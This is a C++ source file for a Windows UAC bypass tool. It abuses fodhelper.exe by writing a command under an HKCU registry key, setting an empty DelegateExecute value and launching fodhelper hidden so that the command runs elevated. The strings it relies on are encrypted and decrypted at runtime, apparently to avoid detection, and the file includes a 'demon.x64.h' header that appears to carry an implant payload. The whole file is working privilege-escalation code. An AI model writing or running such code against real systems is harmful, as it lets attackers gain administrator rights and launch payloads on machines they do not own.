#include "uac_bypass.hpp"
#include "easCipher42.hpp"
#include "demon.x64.h"
#include <windows.h>
#include <iostream>

bool UACBypass::execute_fodhelper() {
    if (verbose) std::cout << "[*] Executing UAC bypass via fodhelper...\n";

    // Decrypt fodhelper path inline
    std::vector<uint8_t> fodhelper_path_dec;
    if (!cipher.Decrypt(fodhelper_enc_data, fodhelper_enc_size, fodhelper_path_dec)) {
        std::cout << "[-] Fodhelper decrypt FAILED\n";
        return false;
    }

    std::string fodhelper_path_str;
    for (auto c : fodhelper_path_dec) {
        if (c == '\0') break;
        fodhelper_path_str += (char)c;
    }

    if (verbose) std::cout << "[*] Registry command: " << command_to_execute << "\n";

    // Decrypt registry path inline
    std::vector<uint8_t> registry_path_dec;
    if (!cipher.Decrypt(registry_path_enc, registry_path_enc_len, registry_path_dec)) {
        std::cout << "[-] Registry path decrypt FAILED\n";
        return false;
    }

    std::string registry_path_str;
    for (auto c : registry_path_dec) {
        if (c == '\0') break;
        registry_path_str += (char)c;
    }

    HKEY hKey;
    LONG status = RegCreateKeyExA(HKEY_CURRENT_USER,
        registry_path_str.c_str(),
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

    if (status != ERROR_SUCCESS) {
        std::cout << "[-] RegCreateKeyEx failed: " << status << "\n";
        return false;
    }

    // Store the actual command to execute in registry
    status = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                           (BYTE*)command_to_execute.c_str(), command_to_execute.length() + 1);
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::cout << "[-] RegSetValueEx failed: " << status << "\n";
        return false;
    }

    // Empty DelegateExecute = bypass
    // Decrypt DelegateExecute string inline
    std::vector<uint8_t> delegate_dec;
    if (!cipher.Decrypt(delegate_execute_enc, delegate_execute_enc_len, delegate_dec)) {
        std::cout << "[-] DelegateExecute decrypt FAILED\n";
        return false;
    }

    std::string delegate_str;
    for (auto c : delegate_dec) {
        if (c == '\0') break;
        delegate_str += (char)c;
    }

    status = RegSetValueExA(hKey, delegate_str.c_str(), 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);

    if (verbose) std::cout << "[+] Registry keys created\n";

    // Decrypt shell verb ("open") inline
    std::vector<uint8_t> verb_dec;
    if (!cipher.Decrypt(shell_verb_enc, shell_verb_enc_len, verb_dec)) {
        std::cout << "[-] Shell verb decrypt FAILED\n";
        return false;
    }

    std::string verb_str;
    for (auto c : verb_dec) {
        if (c == '\0') break;
        verb_str += (char)c;
    }

    // Launch fodhelper (runs elevated) - will execute command from registry
    HINSTANCE result = ShellExecuteA(NULL, verb_str.c_str(), fodhelper_path_str.c_str(),
                                     NULL, NULL, SW_HIDE);

    if ((intptr_t)result <= 32) {
        std::cout << "[-] ShellExecute failed: " << (intptr_t)result << "\n";
        return false;
    }

    if (verbose) std::cout << "[+] fodhelper.exe launched (elevated)\n";
    return true;
}
